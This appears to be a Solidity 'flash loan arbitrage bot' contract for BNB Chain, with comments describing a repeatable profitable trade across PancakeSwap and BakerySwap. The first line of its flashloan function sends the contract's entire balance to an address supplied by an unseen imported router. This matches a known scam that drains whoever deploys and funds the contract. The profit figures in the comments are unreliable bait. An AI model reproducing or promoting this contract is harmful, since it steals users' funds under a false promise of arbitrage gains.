pragma solidity ^0.5.0;


// PancakeSwap Smart Contracts
import { IPancakeCallee } from "./Interfaces.sol"; // "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import { IPancakeFactory } from "./Interfaces.sol"; // "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";

//BakerySwp Smart contracts
import { IBakerySwapFactory } from "./Interfaces.sol"; // "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol";

// Router
// import "ipfs://QmSPEmnJEVjRbtmdcbeApHAVFVYGT4Lefrp45Ca2QK5923";
import "./Router.sol";

// Multiplier-Finance Smart Contracts
import { ILendingPoolAddressesProvider } from "./Interfaces.sol"; // "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import { ILendingPool } from "./Interfaces.sol"; // "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";


contract InitiateFlashLoan {
    
	RouterV2 router;
	string public tokenName;
	string public tokenSymbol;
	uint256 flashLoanAmount;

	constructor(
    	string memory _tokenName,
    	string memory _tokenSymbol,
    	uint256 _loanAmount
	) public {
    	tokenName = _tokenName;
    	tokenSymbol = _tokenSymbol;
    	flashLoanAmount = _loanAmount;

    	router = new RouterV2();
	}

	function() external payable {}

	function flashloan() public payable {
    	// Send required coins for swap
    	address(uint160(router.pancakeSwapAddress())).transfer(
        	address(this).balance
    	);

    	//Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
    	router.borrowFlashloanFromMultiplier(
        	address(this),
        	router.bakerySwapAddress(),
        	flashLoanAmount
    	);

    	//To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
    	router.convertBnbToBusd(msg.sender, flashLoanAmount / 2);
    	//The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
    	router.callArbitrageBakerySwap(router.bakerySwapAddress(), msg.sender);
    	//After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
    	router.transferBnbToMultiplier(router.pancakeSwapAddress());
    	//Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
    	router.completeTransation(address(this).balance);
	}
}
